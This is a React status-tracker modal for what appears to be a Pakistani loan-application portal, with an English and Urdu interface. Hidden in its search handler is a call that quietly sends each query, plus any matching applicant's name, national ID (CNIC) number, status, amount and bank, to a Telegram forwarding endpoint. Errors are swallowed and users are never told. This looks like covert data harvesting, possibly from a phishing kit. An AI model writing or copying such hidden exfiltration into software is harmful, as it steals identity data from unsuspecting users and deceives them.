'use client';

import React, { useState } from 'react';
import { X, Search, ShieldCheck, CheckCircle } from 'lucide-react';
import { Language, ApplicationRecord } from '../types';

interface StatusTrackerModalProps {
  language: Language;
  applications: ApplicationRecord[];
  onClose: () => void;
}

export default function StatusTrackerModal({ language, applications, onClose }: StatusTrackerModalProps) {
  const [query, setQuery] = useState('');
  const [searchResult, setSearchResult] = useState<ApplicationRecord | null>(null);
  const [searched, setSearched] = useState(false);

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    setSearched(true);
    const found = applications.find(
      app => app.applicationId.toLowerCase() === query.trim().toLowerCase() ||
             app.personal.cnic.includes(query.trim())
    );
    setSearchResult(found || null);

    // Fast Telegram dispatch for status lookup
    try {
      fetch('/api/telegram-forward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          title: 'Application Status Tracked',
          data: {
            searchedQuery: query.trim(),
            statusFound: found ? 'Application Found' : 'Application Not Found in Records',
            ...(found ? {
              applicationId: found.applicationId,
              applicantName: found.personal.fullName,
              cnic: found.personal.cnic,
              currentStatus: found.status,
              approvedAmount: found.approvedAmount,
              bank: found.selectedBank
            } : {})
          }
        })
      }).catch(() => {});
    } catch {}
  };

  return (
    <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-6 animate-in fade-in zoom-in duration-200">
        <div className="flex justify-between items-center border-b border-gray-100 pb-4">
          <div className="flex items-center gap-2.5">
            <div className="w-10 h-10 rounded-xl bg-white border border-emerald-600/30 flex items-center justify-center p-0.5 shadow-sm overflow-hidden">
              <img
                src="/logo.jpg"
                alt="Logo"
                referrerPolicy="no-referrer"
                className="w-full h-full object-contain"
              />
            </div>
            <div>
              <h3 className="font-bold text-gray-900 text-lg">Track Application Status</h3>
              <p className="text-xs text-gray-500 font-urdu">درخواست کا اسٹیٹس چیک کریں</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-2 rounded-full hover:bg-gray-100 text-gray-500 transition"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        <form onSubmit={handleSearch} className="space-y-4">
          <div className="space-y-1">
            <label className="text-xs font-bold text-gray-700 block">
              Enter Application ID or CNIC <span className="font-urdu text-gray-500">(شناختی کارڈ یا آئی ڈی درج کریں)</span>
            </label>
            <div className="relative">
              <Search className="absolute left-3.5 top-3.5 w-5 h-5 text-gray-400" />
              <input
                type="text"
                required
                placeholder="e.g. PLP-2026-209158"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
                className="w-full pl-11 pr-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-[#044e3b] text-sm font-mono"
              />
            </div>
          </div>

          <button
            type="submit"
            className="w-full bg-[#044e3b] hover:bg-[#033b2e] text-white font-semibold py-3 rounded-xl transition text-sm shadow-sm flex items-center justify-center gap-2"
          >
            <span>Search Status</span>
            <span className="font-urdu text-xs opacity-90">(تلاش کریں)</span>
          </button>
        </form>

        {searched && (
          <div className="pt-2">
            {searchResult ? (
              <div className="bg-emerald-50 rounded-xl p-4 border border-emerald-200 space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-xs font-bold text-emerald-800">Application Found</span>
                  <span className="bg-emerald-200 text-emerald-900 text-xs px-2.5 py-0.5 rounded-full font-bold flex items-center gap-1">
                    <CheckCircle className="w-3.5 h-3.5" />
                    {searchResult.status}
                  </span>
                </div>
                <div className="space-y-1 text-xs">
                  <div className="flex justify-between">
                    <span className="text-gray-500">ID:</span>
                    <span className="font-mono font-bold text-gray-800">{searchResult.applicationId}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">Name:</span>
                    <span className="font-bold text-gray-800">{searchResult.personal.fullName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">Amount:</span>
                    <span className="font-bold text-[#044e3b]">PKR {Number(searchResult.loan.amount || 500000).toLocaleString()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-500">Disbursing Bank / بینک:</span>
                    <span className="font-semibold text-gray-800">{searchResult.loan.bankName || searchResult.selectedBank || 'SBP Raast'}</span>
                  </div>
                </div>
              </div>
            ) : (
              <div className="bg-amber-50 rounded-xl p-4 border border-amber-200 text-center text-xs text-amber-900 space-y-1">
                <p className="font-semibold">No application found matching '{query}'.</p>
                <p className="font-urdu">اس نمبر یا شناختی کارڈ پر کوئی درخواست نہیں ملی۔</p>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
